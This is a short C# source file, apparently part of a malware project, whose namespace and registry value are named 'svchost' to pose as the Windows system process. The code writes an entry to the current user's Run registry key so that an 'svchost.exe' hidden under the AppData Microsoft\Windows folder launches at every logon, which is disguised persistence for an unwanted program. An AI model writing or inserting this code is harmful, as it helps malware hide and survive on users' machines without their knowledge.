using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using Microsoft.Win32;

namespace svchost
{
    class RegistryManager
    {
        public RegistryManager()
        {
        }

        public void CheckRegistry()
        {
            RegistryKey _RegistryKey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);

            if (_RegistryKey.GetValue("svchost", null) == null)
            {
                _RegistryKey.SetValue("svchost", Path.Combine(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows"), "svchost.exe"));
                _RegistryKey.Close();
            }
        }
    }
}
